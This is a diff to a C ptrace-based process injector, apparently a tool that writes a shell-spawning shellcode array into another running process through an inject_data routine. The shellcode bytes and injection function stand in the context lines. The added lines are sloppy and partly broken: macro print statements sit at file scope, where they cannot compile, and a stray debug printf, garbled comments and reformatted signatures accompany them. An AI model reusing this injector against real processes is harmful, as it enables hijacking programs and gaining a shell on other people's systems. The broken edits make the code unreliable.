@@ -12,7 +12,20 @@
 #include <sys/user.h>
 #include <sys/reg.h>
 
+
+//will need work my ide had broken 
+#define QUOTE_MACRO_VALUE(MACRO) #MACRO
+#define print_definition(MACRO) printf("%-24s = %s\n", #MACRO, QUOTE_MACRO_VALUE(MACRO))
+#define print_undefined(MACRO)  printf("%-24s = n/a\n", #MACRO)
+#ifdef __amd64               
+    print_definition(__amd64); //def for x86 needs to be done for intel
+#else
+    print_undefined(__amd64);
+#endif 
+///if not detected program ends soo exit pogram 
+
 #define SHELLCODE_SIZE 32
+
 
 unsigned char *shellcode = 
   "\x48\x31\xc0\x48\x89\xc2\x48\x89"
@@ -21,9 +34,17 @@ unsigned char *shellcode =
   "\x2f\x73\x68\x00\xcc\x90\x90\x90";
 
 
-int
-inject_data (pid_t pid, unsigned char *src, void *dst, int len)
+int inject_data (pid_t pid, unsigned char *src, void *dst, int len)
 {
+
+
+
+
+
+
+printf("test 1234"); 
+
+
   int      i;
   uint32_t *s = (uint32_t *) src;
   uint32_t *d = (uint32_t *) dst;
@@ -39,8 +60,7 @@ inject_data (pid_t pid, unsigned char *src, void *dst, int len)
   return 0;
 }
 
-int
-main (int argc, char *argv[])
+int main (int argc, char *argv[])
 {
   pid_t                   target;
   struct user_regs_struct regs;
